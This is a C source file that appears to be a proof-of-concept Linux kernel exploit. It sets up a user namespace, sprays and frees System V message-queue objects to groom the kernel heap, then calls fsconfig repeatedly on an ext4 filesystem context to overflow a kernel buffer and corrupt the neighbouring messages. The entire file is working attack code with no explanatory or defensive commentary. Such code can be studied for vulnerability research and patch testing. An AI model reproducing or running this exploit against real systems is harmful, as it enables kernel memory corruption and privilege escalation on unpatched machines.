#include "util.h"

#define _GNU_SOURCE

#define SPRAY_COUNT (0x30)
#define MSG_SIZE (0xfe8)

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    return;
}

int main() {
    printf("[*] pid @ %d\n", getpid());

    unshare_setup(getuid(), getgid());

    long msg_type = 1;

    char msg_buf[MSG_SIZE + 1];
    memset(msg_buf, 0x41, MSG_SIZE);
    msg_buf[MSG_SIZE] = '\0';

    for (int i = 0; i < SPRAY_COUNT; i++)
        send_msg(new_queue(), msg_type, msg_buf, MSG_SIZE);

    int queue_arr[SPRAY_COUNT];

    for (int i = 0; i < SPRAY_COUNT; i++) {
        queue_arr[i] = new_queue();
        send_msg(queue_arr[i], msg_type, msg_buf, MSG_SIZE);
	    open("/proc/self/stat", O_RDONLY);
    }

    for (int i = 1; i < SPRAY_COUNT; i += 2)
        recv_msg(queue_arr[i], msg_type, msg_buf, MSG_SIZE);

    int fd = fsopen("ext4", 0);
    if (fd < 0) {
	    perror("fsopen");
        exit(1);
    }
    printf("[*] fd @ %d\n", fd);

    char buf[0x100] = { 0, };

    memset(buf, 0x41, 0x11 - 2);
    for (int i = 0; i < 0xf; i++)
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buf, 0);

    memset(buf, 0x41, 0x100 - 2);
    for (int i = 0; i < 0xf; i++)
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buf, 0);

    for (int i = 1; i < SPRAY_COUNT; i += 2) {
        send_msg(queue_arr[i], msg_type, buf, MSG_SIZE);
	    open("/proc/self/stat", O_RDONLY);
    }

    debug();

    return 0;
}